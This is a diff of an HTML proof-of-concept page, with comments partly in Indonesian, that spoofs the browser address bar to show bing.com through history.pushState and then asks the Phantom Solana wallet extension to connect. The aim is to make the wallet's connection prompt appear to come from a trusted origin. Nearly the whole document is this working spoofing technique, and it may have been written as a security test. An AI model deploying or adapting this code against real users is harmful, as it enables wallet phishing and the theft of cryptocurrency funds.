@@ -3,24 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Phantom Wallet Origin Spoofing</title>
+    <title>Phantom Wallet Spoofing Test</title>
     <script>
+        // Fungsi spoofing untuk Phantom Wallet
         function spoofOriginAndConnect() {
-            // Change the address bar to spoof a trusted origin
-            history.pushState({}, "Bing.com", "https://bing.com:1234");
+            console.log("Spoofing test initiated...");
 
-            // Attempt to interact with Phantom Wallet
+            // Manipulasi URL di address bar
+            history.pushState({}, "Trusted Page", "https://bing.com:1234");
+
+            // Coba berinteraksi dengan Phantom Wallet
             try {
                 setTimeout(() => {
                     if (window.phantom && window.phantom.solana) {
-                        // Attempt to spoof the origin and establish a connection
-                        window.phantom.solana.connect().then((response) => {
-                            console.log("Connection successful:", response);
-                            alert("Wallet connected: " + JSON.stringify(response));
-                        }).catch((error) => {
-                            console.error("Connection failed:", error);
-                            alert("Connection failed: " + error.message);
-                        });
+                        window.phantom.solana.connect()
+                            .then((response) => {
+                                console.log("Connection successful:", response);
+                                alert("Wallet connected: " + JSON.stringify(response));
+                            })
+                            .catch((error) => {
+                                console.error("Connection failed:", error);
+                                alert("Connection failed: " + error.message);
+                            });
                     } else {
                         console.error("Phantom Wallet not detected.");
                         alert("Phantom Wallet not detected.");
@@ -31,10 +35,16 @@
                 alert("Error during spoofing attempt: " + e.message);
             }
         }
+
+        // Tambahkan listener saat DOM siap
+        document.addEventListener("DOMContentLoaded", () => {
+            const button = document.getElementById("spoof-test-btn");
+            button.addEventListener("click", spoofOriginAndConnect);
+        });
     </script>
 </head>
 <body>
     <h1>Phantom Wallet Spoofing Test</h1>
-    <button onclick="spoofOriginAndConnect()">Run Spoofing Test</button>
+    <button id="spoof-test-btn">Run Spoofing Test</button>
 </body>
 </html>
